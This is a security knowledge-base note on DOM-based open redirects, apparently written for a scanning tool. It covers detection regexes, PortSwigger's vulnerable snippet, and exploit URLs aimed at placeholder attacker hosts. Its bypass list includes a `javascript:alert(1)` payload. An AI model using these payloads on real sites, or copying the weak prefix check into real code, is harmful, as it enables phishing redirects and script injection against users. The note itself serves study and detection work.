---
title: DOM-based open redirect via taint flow
slug: taint-flow-open-redirect
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/open-redirect, sink/location]
inbound: []
---

# DOM-based open redirect via taint flow

## Pattern

A script reads an attacker-controlled value from a URL source (commonly `location.hash` or `location.search`) and assigns it directly to a navigation sink (`window.location`, `location.href`, `location.replace`) with only a weak prefix check. The attacker supplies a URL that passes the check (e.g. starts with `https:`) but redirects to a malicious host.

## Preconditions

- A JavaScript source reads from `location.hash`, `location.search`, `document.referrer`, or similar.
- The value is used in a navigation assignment without full origin validation.
- A weak check (e.g. `startsWith('https:')`) is present but bypassable, OR no check at all.

## Detection

- `js_analyzer` source: `location.hash`, `location.search`, `location.href`
- `js_analyzer` sink: `window.location`, `location.href`, `location.replace`, `location.assign`
- Taint-chain pattern: `hash → slice → location =`
- Static grep: `location\s*=\s*.*location\.hash` or `location\.replace\(.*hash`

## Triggering

PortSwigger canonical example (hash-based):
```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
   location = goto;
}
```

Exploit URL:
```
https://www.innocent-website.com/example#https://www.evil-user.net
```

Generic fragment redirect (no check):
```
https://target.com/page#https://attacker.com
```

Search-param redirect:
```
https://target.com/redirect?url=https://attacker.com
```

## Bypasses

- `startsWith('https:')` → supply `https://attacker.com` directly.
- `includes('trusted.com')` → supply `https://attacker.com?trusted.com` or `https://trusted.com.attacker.com`.
- `indexOf('/') === 0` (relative check) → use `//attacker.com` (protocol-relative URL).
- URL-encoding the host: `https://%61ttacker.com` — some parsers normalize before the check fires.
- Hash confusion: `#javascript:alert(1)` hits `window.location` as a `javascript:` URI in some sinks.

## Seen-in-the-wild

(none yet)

## References

- [PortSwigger DOM-based vulnerabilities](../../sources/portswigger-dom-based.md) — canonical source, open redirect example
- [DOM XSS SUMMARY](SUMMARY.md)
